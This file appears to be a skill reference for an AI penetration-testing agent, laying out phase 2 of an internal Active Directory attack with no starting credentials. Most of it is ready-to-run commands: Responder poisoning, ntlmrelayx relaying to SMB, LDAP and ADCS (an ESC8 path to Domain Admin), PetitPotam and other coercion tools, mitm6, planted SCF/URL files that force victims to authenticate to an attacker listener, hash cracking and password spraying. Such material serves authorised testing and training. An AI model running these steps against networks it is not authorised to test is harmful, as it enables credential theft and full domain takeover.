---
name: initial-access
version: 1.0.0
description: >
  Initial access techniques for Phase 2 of internal black-box penetration
  testing. Covers the Orange Cyberdefense "No Creds" branch: LLMNR/NBT-NS
  poisoning, NTLM relay, coercion attacks, IPv6 attacks, null sessions,
  default credentials, password spraying, and SCF/URL file drops. Goal is
  to obtain at least ONE valid domain credential or local admin access.
phases: [2]
agents: [access]
sources:
  - https://orange-cyberdefense.github.io/ocd-mindmaps/
  - https://www.thehacker.recipes/ad/movement/ntlm/
  - https://github.com/lgandx/Responder
  - https://github.com/fortra/impacket
  - https://attack.mitre.org/tactics/TA0006/
---

# Initial Access — No Credentials (Phase 2 Reference)

> **Phase 2 goal:** Obtain at least ONE valid domain credential. Any type:
> cleartext password, NTLM hash, Kerberos ticket, or local admin access.
>
> **Orange Cyberdefense mapping:** "No Creds" branch of the AD Mindmap.
> **Constraint:** Zero knowledge. No usernames, no passwords, no domain info
> beyond what Phase 1 discovered.

## TECHNIQUE PRIORITY ORDER

Execute techniques in this order. Each has a recommended time window before
pivoting to the next. Adjust based on environment and Phase 1 findings.

```
1. Responder (LLMNR/NBT-NS poisoning)     — 30-60 min passive capture
2. NTLM Relay (ntlmrelayx)                — concurrent with Responder
3. Coercion attacks (PetitPotam, etc.)     — active, 10 min each
4. IPv6 attacks (mitm6 + WPAD)             — 30-60 min passive
5. Null/Anonymous session enumeration      — 5-10 min
6. Default credential testing              — 5-10 min
7. SCF/URL file drop on writable shares    — set and wait
8. Password spraying (if usernames found)  — last resort, noisy
```

---

## TECHNIQUE 1: LLMNR/NBT-NS/mDNS POISONING (Responder)

**MITRE:** T1557.001 (LLMNR/NBT-NS Poisoning and SMB Relay)
**Orange Cyberdefense:** No Creds -> LLMNR/NBT-NS Poisoning

### What Happens:

When a Windows host fails DNS resolution, it falls back to broadcast
protocols: LLMNR (UDP 5355), NBT-NS (UDP 137), mDNS (UDP 5353). Responder
answers these broadcasts, claiming to be the requested host. The victim
sends its NTLM authentication to Responder, which captures the NetNTLMv2 hash.

### Execution:

```bash
# Start Responder — full poisoning mode
responder -I $INTERFACE -dwPv \
  | tee -a loot/phase2/responder_capture.out

# Flags:
#   -d  Enable DHCP answers (fingerprinting)
#   -w  Start WPAD rogue proxy
#   -P  Force NTLM auth for WPAD
#   -v  Verbose output
```

### Captured Hash Handling:

```bash
# View captured hashes
cat /opt/lgandx-responder/logs/HTTP-NTLMv2-*.txt 2>/dev/null \
  | tee -a loot/phase2/responder_hashes.out
cat /opt/lgandx-responder/logs/SMB-NTLMv2-*.txt 2>/dev/null \
  | tee -a loot/phase2/responder_hashes.out

# Copy hashes for cracking
cp /opt/lgandx-responder/logs/*NTLMv2*.txt loot/credentials/hashes/

# Crack with hashcat (mode 5600 = NetNTLMv2)
hashcat -m 5600 loot/credentials/hashes/ntlmv2_hashes.txt \
  /usr/share/wordlists/rockyou.txt --force
```

### Timing Guidance:

- **First 15 minutes:** Most captures happen early as hosts attempt
  periodic name resolution. If zero captures after 15 min, check if
  LLMNR/NBT-NS is disabled (modern hardened environments).
- **30 minutes:** Reasonable passive window. If no captures, consider
  that the environment may have LLMNR disabled.
- **60 minutes:** Maximum passive wait. If still nothing, pivot to
  active techniques (coercion, IPv6).

**Pi5 ARM64 note:** Responder on ARM64 may need python3.11+. If import
errors occur, check `which python3` and create a venv if needed.

---

## TECHNIQUE 2: NTLM RELAY (ntlmrelayx)

**MITRE:** T1557.001 (LLMNR/NBT-NS Poisoning and SMB Relay)
**Orange Cyberdefense:** No Creds -> NTLM Relay

### Prerequisites:

- Relay targets identified in Phase 1: `loot/phase1/relay_targets.txt`
- Hosts WITHOUT SMB signing enforcement (mandatory for SMB relay)
- Responder running concurrently (captures come in, relays go out)

**CRITICAL:** When running Responder alongside ntlmrelayx, disable
Responder's SMB and HTTP servers to avoid port conflicts:

```bash
# Edit Responder config to disable SMB + HTTP (ntlmrelayx handles these)
# /opt/lgandx-responder/Responder.conf:
#   SMB = Off
#   HTTP = Off
```

### 2.1 SMB Relay (SAM Dump)

If the relayed user has local admin on the target, ntlmrelayx dumps
SAM hashes — yielding local administrator NTLM hashes.

```bash
ntlmrelayx.py -tf loot/phase1/relay_targets.txt -smb2support \
  | tee -a loot/phase2/ntlmrelayx_smb_relay.out
```

### 2.2 LDAP Relay (Domain Enumeration / RBCD)

Relay to a DC's LDAP service for domain enumeration or RBCD setup.
DC must NOT enforce LDAP signing (common misconfiguration).

```bash
# LDAP relay with delegate access (sets up RBCD)
ntlmrelayx.py -t ldap://$DC --delegate-access -smb2support \
  | tee -a loot/phase2/ntlmrelayx_ldap_relay.out

# LDAP relay with enumeration
ntlmrelayx.py -t ldap://$DC -smb2support --enum \
  | tee -a loot/phase2/ntlmrelayx_ldap_enum.out

# LDAPS relay (if LDAP signing enforced, try LDAPS channel binding)
ntlmrelayx.py -t ldaps://$DC --delegate-access -smb2support \
  | tee -a loot/phase2/ntlmrelayx_ldaps_relay.out
```

### 2.3 HTTP Relay to ADCS (ESC8)

If an ADCS CA has HTTP enrollment enabled (certsrv), relay to it.

```bash
ntlmrelayx.py -t http://$CA_HOST/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController \
  | tee -a loot/phase2/ntlmrelayx_adcs_esc8.out
```

**ESC8 + DC coercion = instant Domain Admin path.** If you can coerce
a DC to authenticate (PetitPotam) and relay to ADCS HTTP enrollment,
you get a DC certificate -> DC NTLM hash -> DCSync.

---

## TECHNIQUE 3: COERCION ATTACKS (Force Authentication)

**MITRE:** T1187 (Forced Authentication)
**Orange Cyberdefense:** No Creds -> Coercion

Coercion attacks force a target machine to authenticate to our listener.
Combine with ntlmrelayx for relay or Responder for hash capture.

### 3.1 PetitPotam (EFS — Unauthenticated)

```bash
# Unauthenticated EFS coercion (patched in modern builds but still works
# on many environments — especially if EFS role is installed)
python3 PetitPotam.py $LISTENER_IP $TARGET_DC \
  | tee -a loot/phase2/petitpotam_$TARGET_DC.out

# If unauthenticated version patched, try with creds later (Phase 3)
```

### 3.2 PrinterBug / SpoolService

```bash
# Requires valid creds (Phase 3 usually), but check if anonymous works
python3 printerbug.py $DOMAIN/$USER:$PASS@$TARGET $LISTENER_IP \
  | tee -a loot/phase2/printerbug_$TARGET.out

# Or using rpcdump to check if spooler is running
rpcdump.py $TARGET | grep -i spooler \
  | tee -a loot/phase2/rpcdump_spooler_$TARGET.out
```

### 3.3 DFSCoerce

```bash
python3 dfscoerce.py -d $DOMAIN $LISTENER_IP $TARGET \
  | tee -a loot/phase2/dfscoerce_$TARGET.out
```

### 3.4 ShadowCoerce

```bash
python3 shadowcoerce.py -d $DOMAIN $LISTENER_IP $TARGET \
  | tee -a loot/phase2/shadowcoerce_$TARGET.out
```

### 3.5 Coercer (Multi-Protocol Coercion Scanner)

```bash
# coercer scans for all known coercion vectors at once
coercer scan -t $TARGET -u $USER -p "$PASS" -d $DOMAIN \
  | tee -a loot/phase2/coercer_scan_$TARGET.out

# Attempt coercion via all vulnerable methods
coercer coerce -t $TARGET -l $LISTENER_IP -u $USER -p "$PASS" -d $DOMAIN \
  | tee -a loot/phase2/coercer_coerce_$TARGET.out
```

**Decision tree for coercion:**
- Try PetitPotam unauthenticated FIRST (no creds needed)
- Target DCs preferentially (DC machine account -> DCSync potential)
- If PetitPotam patched -> DFSCoerce, ShadowCoerce
- If all unauthenticated coercion fails -> return with creds in Phase 3
- Always combine with ntlmrelayx (not just hash capture)

---

## TECHNIQUE 4: IPv6 ATTACKS (mitm6 + WPAD)

**MITRE:** T1557 (Adversary-in-the-Middle)
**Orange Cyberdefense:** No Creds -> IPv6 Attacks

### What Happens:

mitm6 exploits the fact that most Windows environments have IPv6 enabled
but unconfigured. mitm6 responds to DHCPv6 requests, becoming the default
DNS server via IPv6. It then serves WPAD configuration to redirect web
traffic through ntlmrelayx.

```bash
# Start mitm6 (poisoning via DHCPv6)
mitm6 -d $DOMAIN -i $INTERFACE \
  | tee -a loot/phase2/mitm6_capture.out

# In a separate session: ntlmrelayx targeting LDAP via IPv6
ntlmrelayx.py -6 -t ldaps://$DC -wh wpad.$DOMAIN \
  --delegate-access -smb2support \
  | tee -a loot/phase2/ntlmrelayx_ipv6_relay.out
```

**Timing:** mitm6 captures happen when machines renew DHCPv6 leases or
boot. Allow 30-60 minutes. Works best during business hours when
machines are actively booting and authenticating.

**WARNING:** mitm6 can cause network disruption (DNS redirection). Use
with caution. Confirm ROE allows IPv6 attacks before deploying.

---

## TECHNIQUE 5: NULL/ANONYMOUS SESSION ENUMERATION

**MITRE:** T1087.002 (Domain Account Discovery)
**Orange Cyberdefense:** No Creds -> Null Sessions

Quick checks that sometimes yield user lists or share access without creds.

```bash
# Null session SMB (empty username + password)
netexec smb $DC -u '' -p '' --shares \
  | tee -a loot/phase2/nxc_null_shares_$DC.out
netexec smb $DC -u '' -p '' --users \
  | tee -a loot/phase2/nxc_null_users_$DC.out
netexec smb $DC -u '' -p '' --pass-pol \
  | tee -a loot/phase2/nxc_null_passpol_$DC.out

# Guest account (often enabled with empty password)
netexec smb $DC -u 'guest' -p '' --shares \
  | tee -a loot/phase2/nxc_guest_shares_$DC.out

# RPC null session enumeration
rpcclient -U '' -N $DC -c 'enumdomusers;enumdomgroups;getdompwinfo' \
  | tee -a loot/phase2/rpc_null_enum_$DC.out

# Anonymous LDAP bind
ldapsearch -x -H ldap://$DC -b "DC=$DC1,DC=$DC2" \
  "(objectClass=user)" sAMAccountName 2>&1 \
  | tee -a loot/phase2/ldap_anon_$DC.out
```

**If usernames obtained:** Feed into password spraying (Technique 8).
**If password policy obtained:** Use lockout threshold - 1 for spray limit.

---

## TECHNIQUE 6: DEFAULT CREDENTIAL TESTING

**MITRE:** T1078.001 (Valid Accounts: Default Accounts)

```bash
# Test common default credentials against discovered services
# SSH
netexec ssh $TARGET -u 'admin' -p 'admin' \
  | tee -a loot/phase2/nxc_default_ssh_$TARGET.out

# MSSQL
netexec mssql $TARGET -u 'sa' -p 'sa' \
  | tee -a loot/phase2/nxc_default_mssql_$TARGET.out
netexec mssql $TARGET -u 'sa' -p '' \
  | tee -a loot/phase2/nxc_default_mssql_blank_$TARGET.out

# Web management interfaces (check httpx results from Phase 1)
# Common: admin/admin, admin/password, admin/<blank>

# SNMP community strings
onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt $TARGET \
  | tee -a loot/phase2/snmp_community_$TARGET.out
```

---

## TECHNIQUE 7: SCF/URL FILE ATTACKS ON WRITABLE SHARES

**MITRE:** T1187 (Forced Authentication)
**Orange Cyberdefense:** No Creds -> SCF/URL File Drop

If Phase 1 found writable shares (anonymous write access), plant a file
that forces authentication back to our Responder/ntlmrelayx listener.

```bash
# Check for writable shares (anonymous)
smbmap -H $TARGET -u '' -p '' | tee -a loot/phase2/smbmap_anon_$TARGET.out

# Create SCF file (forces icon load from UNC path)
cat > /tmp/desktop.scf << 'EOF'
[Shell]
Command=2
IconFile=\\$LISTENER_IP\share\icon.ico
[Taskbar]
Command=ToggleDesktop
EOF

# Create URL file (alternative)
cat > /tmp/shortcut.url << 'EOF'
[InternetShortcut]
URL=file://$LISTENER_IP/share
EOF

# Upload to writable share
smbclient //$TARGET/$SHARE -U '' -N -c 'put /tmp/desktop.scf @desktop.scf'
```

**Timing:** Set and wait. When a user browses the share, their machine
loads the icon from our listener, triggering NTLM authentication.
Most effective in shared folders that users access frequently.

---

## TECHNIQUE 8: PASSWORD SPRAYING

**MITRE:** T1110.003 (Password Spraying)
**Orange Cyberdefense:** No Creds -> Password Spraying

**LAST RESORT.** Only attempt if:
1. Usernames obtained (null sessions, OSINT, LDAP anonymous bind)
2. Password policy obtained (know lockout threshold and window)
3. All passive/relay techniques exhausted

```bash
# Get password policy FIRST
netexec smb $DC -u '' -p '' --pass-pol \
  | tee -a loot/phase2/nxc_passpol_$DC.out

# Spray one password at a time — NEVER exceed lockout threshold
netexec smb $DC -u loot/phase2/users.txt -p 'Spring2026!' \
  --no-bruteforce --continue-on-success \
  | tee -a loot/phase2/nxc_spray_Spring2026.out

# Common spray passwords (try one per lockout window):
#   Season+Year:     Spring2026!, Summer2026!, Winter2025!
#   Company+Year:    $COMPANY2026!, $COMPANY2025!
#   Generic:         Welcome1!, Password1!, P@ssw0rd!
#   Month+Year:      March2026!, February2026!
```

**Lockout safety rules:**
- Lockout threshold = N -> spray maximum N-2 passwords per window
- Lockout window = X minutes -> wait X+5 minutes between spray rounds
- If no lockout policy found -> assume threshold of 5, be conservative
- NEVER spray Domain Admin accounts (separate lockout monitoring)

---

## PHASE 2 SUCCESS CRITERIA

The Phase 2 -> Phase 3 gate requires at least ONE of:

| Credential Type | How Obtained | Next Step |
|----------------|--------------|-----------|
| Cleartext password | Responder capture + crack, spray, default creds | Use directly for Phase 3 |
| NetNTLMv2 hash (cracked) | Responder + hashcat | Use cleartext from crack |
| NT hash (from SAM dump) | ntlmrelayx SMB relay | Pass-the-Hash in Phase 4 |
| Kerberos TGT | RBCD via LDAP relay | Use ticket for Phase 3 |
| ADCS certificate | ESC8 relay | Authenticate with cert for Phase 3 |
| Local admin access | SAM dump, default creds | Harvest more creds in Phase 4 |

---

## MASTER DECISION TREE

```
Phase 2 Start (No Credentials)
  |
  +-> Relay targets exist (from Phase 1)?
  |     YES -> Run Responder + ntlmrelayx concurrently (30-60 min)
  |     NO  -> Run Responder alone for hash capture (30 min)
  |
  +-> ADCS HTTP enrollment found (Phase 1)?
  |     YES -> ntlmrelayx targeting ADCS (ESC8) — HIGHEST priority
  |
  +-> Captures after 30 min?
  |     YES -> Crack hashes / use relayed access -> Phase 3
  |     NO  -> Pivot to active techniques:
  |             +-> PetitPotam (unauthenticated) against DCs
  |             +-> DFSCoerce / ShadowCoerce against all targets
  |             +-> mitm6 + WPAD relay (30-60 min passive)
  |
  +-> Still no creds after coercion + IPv6?
  |     +-> Null session enumeration (quick, 5-10 min)
  |     +-> Default credential testing (5-10 min)
  |     +-> SCF/URL file drop on writable shares (set and wait)
  |
  +-> Usernames obtained (null sessions, OSINT)?
  |     YES -> Password spraying (cautious, respect lockout)
  |     NO  -> Report to Zero: Phase 2 blocked, no credential path found.
  |            Suggest: expand scope, extend wait time, try gray-box.
  |
  +-> Got at least one credential?
       YES -> Phase 2 complete. Advance to Phase 3.
       NO  -> Escalate to operator for guidance.
```
